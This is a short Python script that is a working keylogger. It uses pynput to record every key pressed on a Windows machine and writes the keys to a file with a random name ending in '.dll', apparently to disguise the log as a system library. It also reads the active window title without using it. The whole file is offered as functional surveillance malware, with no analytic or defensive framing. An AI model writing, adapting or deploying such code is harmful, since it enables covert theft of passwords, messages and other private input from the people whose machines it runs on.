import pynput
import base64
import random
import string
from pynput import keyboard
from win32gui import GetWindowText, GetForegroundWindow


# generate a random filename for our log file
fname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)) + ".dll"


def log():
    currentwindow = (GetWindowText(GetForegroundWindow()))

    def on_press(key):
        kl = []
        ks = str(key).strip("'")
        kl.append(ks)
        log_file(kl)
        kl = []

    def on_release(key):
        r = str(key)

    def log_file(kl):
        with open(fname, "a+") as f:
            for key in kl:
                if "Key.space" in key:
                    f.write("\n")
                else:
                    f.write(key)

    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()


log()
